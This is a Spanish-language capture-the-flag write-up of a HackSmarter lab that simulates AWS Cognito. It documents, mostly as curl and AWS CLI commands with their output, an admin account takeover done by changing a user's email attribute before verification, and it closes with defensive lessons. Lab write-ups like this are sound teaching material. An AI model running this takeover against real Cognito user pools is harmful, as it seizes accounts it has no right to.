# Writeup: Incognito Travel (HackSmarter — Easy)

Incognito Travel es una máquina **Easy** diseñada para simular un entorno AWS con **Cognito** como servicio de autenticación. El recorrido comienza con el análisis del código fuente de una página web que expone la configuración de un **User Pool de Cognito** y la URL de una **API Gateway**. Con esta información, se registra un usuario y se obtienen tokens de autenticación. A través de la API, se descubre que el usuario autenticado puede actualizar sus propios atributos en Cognito, incluyendo el correo electrónico, sin verificación adicional. Aprovechando esta vulnerabilidad, se cambia el correo electrónico por el del administrador (`cory@hacksmarter.hsm`) y se utiliza la contraseña del atacante para iniciar sesión como el administrador, obteniendo así la bandera final.

---

## 🎯 Objetivo / Scope

Incognito Travel está implementando un nuevo proceso de autenticación para su aplicación de viajes utilizando **Amazon Cognito**. Antes del despliegue en producción, han contratado a Hack Smarter para probar rigurosamente el nuevo flujo de autenticación. El objetivo es tomar el control de la cuenta de administrador y demostrar el impacto de la vulnerabilidad.

---

## 🔍 Fase 1: Reconocimiento inicial

### 1.1 Análisis del código fuente

Accedemos a la URL proporcionada y, tras inspeccionar el código fuente de la página (`view-source`), encontramos un fragmento de JavaScript que contiene información sensible:

```html
<script>
    const COGNITO_CONFIG = {
        userPoolId: 'us-east-1_tKqOKijp9',
        clientId: '7cfhph9m8mk8ukuco2m6qibdit'
    };
    const API_URL = 'https://XXXXXX.execute-api.us-east-1.amazonaws.com';
    // ... código de autenticación ...
</script>
```

**Observaciones clave:**

- **Cognito User Pool ID**: `us-east-1_tKqOKijp9` — identificador del User Pool de Cognito.
- **Cognito Client ID**: `7cfhph9m8mk8ukuco2m6qibdit` — identificador del cliente de Cognito.
- **URL de la API**: `https://XXXXXXX.execute-api.us-east-1.amazonaws.com` — endpoint de API Gateway.

**Contexto:** Amazon Cognito es un servicio de autenticación y autorización que permite registrar y autenticar usuarios. Un **User Pool** es un directorio de usuarios, y un **Client ID** identifica una aplicación que interactúa con el User Pool. La URL de la API Gateway es el punto de entrada para las funciones backend (probablemente Lambda) que manejan las solicitudes de autenticación y perfil.

---

## 🔐 Fase 2: Registro de un usuario

### 2.1 Creación de una cuenta

Usamos el endpoint `/register` de la API para crear un nuevo usuario. En la aplicación, este endpoint se comunica con Cognito y crea un usuario en el User Pool:

```bash
curl -X POST https://XXXXXX.execute-api.us-east-1.amazonaws.com/register \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@hacksmarter.hsm", "password": "Password123!"}'
```

```json
{"message":"Registration Successful."}
```

La cuenta se ha creado exitosamente.

### 2.2 Autenticación y obtención de tokens

Iniciamos sesión con el usuario recién creado para obtener los tokens de autenticación:

```bash
curl -s -X POST https://XXXXXX.execute-api.us-east-1.amazonaws.com/login \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@hacksmarter.hsm", "password": "Password123!"}' | jq
```

```json
{
  "message": "Login Successful",
  "tokens": {
    "id_token": "[REDACTED]",
    "access_token": "[REDACTED]"
  }
}
```

El login es exitoso y recibimos dos tokens:

- **`id_token`**: Token JWT que contiene información del usuario (email, sub, etc.). Se utiliza para autenticar al usuario en la API.
- **`access_token`**: Token JWT utilizado para autorizar acciones en el User Pool de Cognito (como actualizar atributos).

**Explicación:** Los tokens JWT (JSON Web Tokens) son credenciales firmadas que permiten al servidor verificar la identidad del usuario sin necesidad de consultar la base de datos en cada solicitud. El `id_token` se usa para la autenticación en la API, mientras que el `access_token` se usa para operaciones en Cognito.

Exportamos el token para usarlo en futuras solicitudes:

```bash
export TOKEN="[REDACTED]"
export ACCESS_TOKEN="[REDACTED]"
```

---

## 🔬 Fase 3: Enumeración de la API y exploración de vulnerabilidades

### 3.1 Solicitud del perfil del usuario autenticado

Primero, verificamos que podemos obtener el perfil del usuario autenticado:

```bash
curl -s -X GET https://XXXXXX.execute-api.us-east-1.amazonaws.com/profile \
  -H "Authorization: Bearer $TOKEN" | jq
```

```json
{
  "profile": {
    "email": "attacker@hacksmarter.hsm",
    "name": "Guest Explorer",
    "role": "user",
    "trips": []
  }
}
```

El endpoint `/profile` devuelve la información del usuario autenticado. Esto es normal y esperado.

### 3.2 Intento de IDOR (Insecure Direct Object Reference)

A veces, los desarrolladores permiten que un usuario consulte el perfil de otro simplemente cambiando un parámetro (como el email o un ID). Probamos a enviar un email diferente en el cuerpo de la solicitud:

```bash
curl -s -X GET https://XXXXXX.execute-api.us-east-1.amazonaws.com/profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"cory@hacksmarter.hsm"}' | jq
```

```json
{
  "profile": {
    "email": "attacker@hacksmarter.hsm",
    "name": "Guest Explorer",
    "role": "user",
    "trips": []
  }
}
```

La API ignora el parámetro y devuelve el perfil del usuario autenticado. No hay IDOR.

### 3.3 Intento de Mass Assignment

Probamos a enviar campos adicionales en la solicitud de actualización de perfil, intentando modificar atributos que no deberían ser editables:

```bash
curl -s -X POST https://XXXXXX.execute-api.us-east-1.amazonaws.com/update-profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Attacker", "flag":"true", "custom:flag":"true"}' | jq
```

```json
{
  "message": "Profile updated successfully (Mock)"
}
```

La API responde con éxito, pero al consultar el perfil nuevamente, los campos no se han actualizado:

```bash
curl -s -X GET https://XXXXXX.execute-api.us-east-1.amazonaws.com/profile \
  -H "Authorization: Bearer $TOKEN" | jq
```

```json
{
  "profile": {
    "email": "attacker@hacksmarter.hsm",
    "name": "Guest Explorer",
    "role": "user",
    "trips": []
  }
}
```

El Mass Assignment no funcionó; la API ignora los campos adicionales.

---

## 🔑 Fase 4: Exploración de Cognito

### 4.1 Obtención de atributos del usuario

Dado que tenemos el `User Pool ID` y el `Client ID`, podemos usar la AWS CLI para interactuar directamente con Cognito y ver los atributos del usuario:

```bash
aws cognito-idp get-user --region us-east-1 --access-token $ACCESS_TOKEN
```

```json
{
    "Username": "94e82468-9061-7093-dba4-57d8aa39ca5f",
    "UserAttributes": [
        {
            "Name": "email",
            "Value": "attacker@hacksmarter.hsm"
        },
        {
            "Name": "sub",
            "Value": "94e82468-9061-7093-dba4-57d8aa39ca5f"
        }
    ]
}
```

**Explicación:** El comando `get-user` devuelve los atributos del usuario autenticado usando el `access_token`. El campo `sub` es el identificador único del usuario en Cognito.

### 4.2 Intento de actualizar atributos personalizados

Probamos a actualizar un atributo personalizado (`custom:flag`) para ver si podemos manipular privilegios:

```bash
aws cognito-idp update-user-attributes \
  --access-token "$ACCESS_TOKEN" \
  --user-attributes Name="custom:flag",Value="true" \
  --region us-east-1
```

```bash
aws: [ERROR]: An error occurred (NotAuthorizedException) when calling the UpdateUserAttributes operation: A client attempted to write unauthorized attribute
```

El error indica que no tenemos permiso para escribir en atributos personalizados. Esto es una buena práctica de seguridad.

### 4.3 Intento de restablecimiento de contraseña de Cory

Probamos el flujo de `forgot-password` para ver si podemos obtener información sobre el usuario administrador:

```bash
aws cognito-idp forgot-password \
  --client-id 7cfhph9m8mk8ukuco2m6qibdit \
  --username cory@hacksmarter.hsm \
  --region us-east-1
```

```json
{
    "CodeDeliveryDetails": {
        "Destination": "c***@h***",
        "DeliveryMedium": "EMAIL",
        "AttributeName": "email"
    }
}
```

**Análisis:**

1. El usuario `cory@hacksmarter.hsm` **existe** en el User Pool.
2. El código de verificación se envía al correo electrónico real (`c***@h***`), por lo que no podemos interceptarlo.

Esta vía no es explotable.

---

## 🚀 Fase 5: Escalada de privilegios mediante actualización de atributos

### 5.1 Identificación de la vulnerabilidad

Observamos que el usuario autenticado tiene permisos para actualizar sus propios atributos en Cognito. Algunos atributos, como `email`, pueden ser modificados sin verificación adicional si el User Pool no requiere verificación de correo en cada actualización.

### 5.2 Cambio del correo electrónico

Intentamos cambiar el correo electrónico del usuario atacante al correo del administrador (`cory@hacksmarter.hsm`):

```bash
aws cognito-idp update-user-attributes \
  --region us-east-1 \
  --access-token $ACCESS_TOKEN \
  --user-attributes Name=email,Value=Cory@hacksmarter.hsm
```

```json
{
    "CodeDeliveryDetailsList": [
        {
            "Destination": "C***@h***",
            "DeliveryMedium": "EMAIL",
            "AttributeName": "email"
        }
    ]
}
```

La operación es exitosa. El email del usuario atacante ha sido cambiado a `Cory@hacksmarter.hsm`. El sistema envió un código de verificación al nuevo correo, pero la actualización se realizó antes de que se verificara.

### 5.3 Verificación del cambio

Confirmamos que el email ha sido actualizado:

```bash
aws cognito-idp get-user --region us-east-1 --access-token $ACCESS_TOKEN
```

```json
{
    "Username": "94e82468-9061-7093-dba4-57d8aa39ca5f",
    "UserAttributes": [
        {
            "Name": "email",
            "Value": "Cory@hacksmarter.hsm"
        },
        {
            "Name": "sub",
            "Value": "94e82468-9061-7093-dba4-57d8aa39ca5f"
        }
    ]
}
```

El email ahora es `Cory@hacksmarter.hsm`.

---

## 👑 Fase 6: Toma de la cuenta de administrador

### 6.1 Autenticación como Cory

Ahora que el usuario atacante tiene el email de Cory, intentamos iniciar sesión como Cory usando nuestra contraseña original (`Password123!`):

```bash
curl -s -X POST https://XXXXXX.execute-api.us-east-1.amazonaws.com/login \
  -H "Content-Type: application/json" \
  -d '{"email": "Cory@hacksmarter.hsm", "password": "Password123!"}' | jq
```

```json
{
  "message": "Login Successful",
  "tokens": {
    "id_token": "[REDACTED]",
    "access_token": "[REDACTED]"
  }
}
```

¡El login es exitoso! Hemos tomado la cuenta de Cory.

### 6.2 Obtención del perfil de administrador

Exportamos el nuevo token y solicitamos el perfil:

```bash
export TOKEN="[REDACTED]"
curl -s -X GET https://XXXXXX.execute-api.us-east-1.amazonaws.com/profile \
  -H "Authorization: Bearer $TOKEN" | jq
```

```json
{
  "profile": {
    "email": "Cory@hacksmarter.hsm",
    "name": "Cory Admin",
    "role": "admin",
    "trips": ["Tokyo", "London", "New York"],
    "flag": "HSM{REDACTED}"
  }
}
```

La bandera aparece en el perfil. Hemos completado el objetivo.

---

## 📌 Conclusión

Incognito Travel es una máquina **Easy** que combina:

1. **Análisis del código fuente** para descubrir la configuración de Cognito y la URL de API Gateway.
2. **Registro de un usuario** y obtención de tokens de autenticación.
3. **Exploración de la API** para descartar vulnerabilidades como IDOR y Mass Assignment.
4. **Interacción directa con Cognito** para enumerar atributos del usuario.
5. **Actualización del atributo `email`** para cambiar el correo electrónico del usuario atacante al del administrador.
6. **Autenticación con el nuevo email y la contraseña original**, obteniendo acceso a la cuenta de administrador.
7. **Recuperación de la bandera** desde el perfil del administrador.

---

## 📚 Lecciones aprendidas


1. **Los identificadores de Cognito no son secretos, pero deben analizarse junto con la lógica de la aplicación**

   El User Pool ID y el Client ID pueden aparecer en el código frontend. El riesgo surgió porque la aplicación exponía además endpoints de autenticación y permitía modificar atributos sensibles sin controles suficientes.

2. **Los cambios de email deben requerir verificación efectiva**

   El usuario pudo cambiar su email a la dirección del administrador y utilizarlo inmediatamente. Cognito debe configurarse para mantener el valor anterior activo hasta que el nuevo email sea verificado. [docs.aws.amazon](https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-email-phone-verification.html)

3. **Los atributos editables deben configurarse según su sensibilidad**

   El email puede ser mutable, pero su actualización debe controlarse. Los atributos utilizados para autenticación, autorización o recuperación de cuenta no deben cambiarse sin verificación y controles adicionales.

4. **La autorización debe basarse en un identificador estable**

   La aplicación debe utilizar el `sub` del token como identificador principal del usuario, no confiar únicamente en el email, ya que este puede cambiar. El `sub` es el identificador único asignado por Cognito. [docs.aws.amazon](https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-attributes.html)

5. **El email no debe determinar directamente privilegios**

   El rol `admin` debe obtenerse desde claims controlados, grupos o una fuente de autorización independiente. No debe asignarse porque el usuario tenga un email concreto como `cory@hacksmarter.hsm`.

6. **La validación debe realizarse en el backend**

   La API debe validar la firma y claims del JWT, comprobar el `sub`, verificar el estado de `email_verified` cuando corresponda y aplicar autorización basada en el usuario autenticado, no en datos modificables enviados por el cliente.

7. **La recuperación de cuenta también debe protegerse**

   Los flujos de cambio de email, recuperación de contraseña y cambio de atributos deben diseñarse como operaciones sensibles. Deben incluir verificación del nuevo destino, invalidación de sesiones cuando proceda y registro de los cambios.

8. **La información devuelta por la API debe minimizarse**

   El perfil administrativo incluía la flag y datos adicionales. Las APIs deben devolver únicamente la información necesaria y nunca exponer secretos, contraseñas o datos sensibles en respuestas normales.
